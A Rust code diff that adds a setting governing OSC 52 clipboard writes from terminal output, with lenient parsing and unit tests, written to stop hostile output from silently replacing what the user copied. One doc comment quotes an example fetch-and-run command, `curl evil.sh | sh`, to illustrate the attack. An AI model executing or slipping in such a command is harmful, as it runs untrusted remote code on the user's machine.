@@ -211,6 +211,51 @@ fn default_timer_retention_hours() -> u32 {
     24
 }
 
+/// `clipboard_writes` — what happens when terminal output asks to set the OS
+/// clipboard (OSC 52 "store"). Any program's output can carry that sequence:
+/// a `cat` of a hostile file, a curl response, text an agent echoes. Left
+/// unchecked it silently swaps what the user copied for something they will
+/// then paste (`curl evil.sh | sh`). Clipboard READS are never answered in any
+/// mode; this governs the write direction only.
+///
+/// Default [`ClipboardWrites::Ask`]: programs that legitimately use OSC 52
+/// (tmux, vim over ssh) keep working after one confirmation per terminal,
+/// and nothing writes the clipboard without the user having seen it once.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize)]
+#[serde(rename_all = "lowercase")]
+pub enum ClipboardWrites {
+    /// Dropped silently.
+    Off,
+    /// The first write from each terminal asks; the answer sticks for that
+    /// terminal's lifetime.
+    #[default]
+    Ask,
+    /// Applied (with a brief notice).
+    Allow,
+}
+
+impl ClipboardWrites {
+    /// Lenient parse: anything but the three known words is the default.
+    pub fn parse(value: &str) -> Self {
+        match value {
+            "off" => Self::Off,
+            "ask" => Self::Ask,
+            "allow" => Self::Allow,
+            _ => Self::default(),
+        }
+    }
+}
+
+/// Unknown or mistyped values (a hand edit, a value from a newer build) load
+/// as the default instead of failing the whole `Settings` parse — which would
+/// reset every OTHER setting too.
+impl<'de> Deserialize<'de> for ClipboardWrites {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+        let value = serde_json::Value::deserialize(deserializer)?;
+        Ok(value.as_str().map(Self::parse).unwrap_or_default())
+    }
+}
+
 /// The whole settings surface. `#[serde(default)]` at the container level is
 /// what makes a PARTIAL file fill per field: serde takes each missing field
 /// from `Settings::default()` instead of failing the parse.
@@ -257,6 +302,10 @@ pub struct Settings {
     /// docker hiccup are exactly the leak this reaps. The explicit
     /// `POST /agents/reap` control route is NOT gated by this.
     pub agent_reap_orphans: bool,
+    /// OSC 52 clipboard writes from terminal output: off / ask / allow.
+    /// FRONTEND-ONLY consumer — the prompt and the per-terminal memory live
+    /// in the UI, which is the only layer that can ask the user.
+    pub clipboard_writes: ClipboardWrites,
 }
 
 impl Default for Settings {
@@ -288,6 +337,7 @@ impl Default for Settings {
             ctrl_v_pastes: default_ctrl_v_pastes(),
             ctrl_c_copy_only: default_ctrl_c_copy_only(),
             agent_reap_orphans: default_agent_reap_orphans(),
+            clipboard_writes: ClipboardWrites::default(),
         }
     }
 }
@@ -793,6 +843,57 @@ mod tests {
     }
 
     #[test]
+    fn clipboard_writes_defaults_to_ask() {
+        assert_eq!(Settings::default().clipboard_writes, ClipboardWrites::Ask);
+        let json = serde_json::to_value(Settings::default()).unwrap();
+        assert_eq!(json["clipboardWrites"], "ask");
+    }
+
+    #[test]
+    fn clipboard_writes_parses_the_three_words() {
+        for (word, want) in [
+            ("off", ClipboardWrites::Off),
+            ("ask", ClipboardWrites::Ask),
+            ("allow", ClipboardWrites::Allow),
+        ] {
+            assert_eq!(ClipboardWrites::parse(word), want);
+            let s: Settings =
+                serde_json::from_value(serde_json::json!({ "clipboardWrites": word })).unwrap();
+            assert_eq!(s.clipboard_writes, want);
+            // Round-trips through the wire form.
+            let back = serde_json::to_value(&s).unwrap();
+            assert_eq!(back["clipboardWrites"], word);
+        }
+    }
+
+    #[test]
+    fn clipboard_writes_unknown_or_missing_loads_as_ask_without_resetting_the_rest() {
+        for raw in [
+            serde_json::json!({ "fontSize": 16 }),
+            serde_json::json!({ "fontSize": 16, "clipboardWrites": "always" }),
+            serde_json::json!({ "fontSize": 16, "clipboardWrites": "ALLOW" }),
+            serde_json::json!({ "fontSize": 16, "clipboardWrites": 1 }),
+            serde_json::json!({ "fontSize": 16, "clipboardWrites": null }),
+        ] {
+            let s: Settings = serde_json::from_value(raw.clone()).unwrap();
+            assert_eq!(s.clipboard_writes, ClipboardWrites::Ask, "{raw}");
+            assert_eq!(s.font_size, 16, "a bad clipboardWrites must not reset other fields");
+        }
+        assert_eq!(ClipboardWrites::parse(""), ClipboardWrites::Ask);
+    }
+
+    #[test]
+    fn clipboard_writes_survives_a_store_reload() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("settings.json");
+        let mut store = SettingsStore::new(path.clone());
+        let mut next = store.get().clone();
+        next.clipboard_writes = ClipboardWrites::Off;
+        store.set(next).unwrap();
+        assert_eq!(SettingsStore::new(path).get().clipboard_writes, ClipboardWrites::Off);
+    }
+
+    #[test]
     fn wire_shape_is_camel_case() {
         let json = serde_json::to_value(Settings::default()).unwrap();
         for key in [
@@ -809,6 +910,7 @@ mod tests {
             "ctrlVPastes",
             "ctrlCCopyOnly",
             "agentReapOrphans",
+            "clipboardWrites",
         ] {
             assert!(json.get(key).is_some(), "missing wire key {key}");
         }
